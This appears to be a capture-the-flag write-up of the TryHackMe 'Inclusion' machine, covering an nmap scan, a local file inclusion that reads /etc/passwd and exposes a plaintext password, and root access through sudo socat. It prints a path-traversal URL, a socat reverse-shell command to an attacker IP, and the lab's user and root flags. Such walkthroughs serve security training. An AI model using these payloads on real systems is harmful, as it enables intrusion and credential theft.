# Inclusion - THM 

## Info gathering 
## Lets start with a nmap scan 
```
# Nmap 7.92 scan initiated Wed Nov 17 20:23:13 2021 as: nmap -sC -sV -oN nmap 10.10.105.36
Nmap scan report for 10.10.105.36
Host is up (0.17s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp   open     http     Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
1433/tcp filtered ms-sql-s
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov 17 20:24:12 2021 -- 1 IP address (1 host up) scanned in 58.33 seconds

```
## Enumeration 

### Here we get to know that the machine is running a web server, lets check that 
### Side by side lets run gobuster (Didn't find anything), After manual enumerating on the web server
### We found an article named "lfiaatack" and the url are as follows
```
http://10.10.105.36/article?name=lfiattack
```
 
## We modified this a little bit to check the LFI(Local File Incusion), by using 
```
http://10.10.105.36/article?name=../../../../../etc/passwd
```

### And here we get to know that this is ?name= variable is vulnerable to LFI
### Also by modifying the url we got the creds
```
 root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

```
falconfeast:rootpassword
```

## Here we got the initial foothold to the machine and also got our user flag 
```
falconfeast@inclusion:~$ ls
articles  user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799

```

# Its time for Prev Esc
## Now , By using sudo -l we get 
```
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat

```
## Here we get to know that we can run socat as root 
### So lets do it 

### Checking the SUID Binary on GTFO Bins we get to know the SUID i.e on our machine (Attacking Machine)
```
socat file:`tty`,raw,echo=0 tcp-listen:12345
```
### On the victims machine 
```
sudo /usr/bin/socat tcp-connect:10.9.52.153:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane
```

# BOOOOOMMMMMMMMMM!!!!!!!!!!!, On our attacker box we got the root shell!!!!1

### And here we find our last and final piece of the puzzel i.e our root flag 
```
## cat root.txt                                                                   
42964104845495153909 
```

# BY SIG WOTTS <3
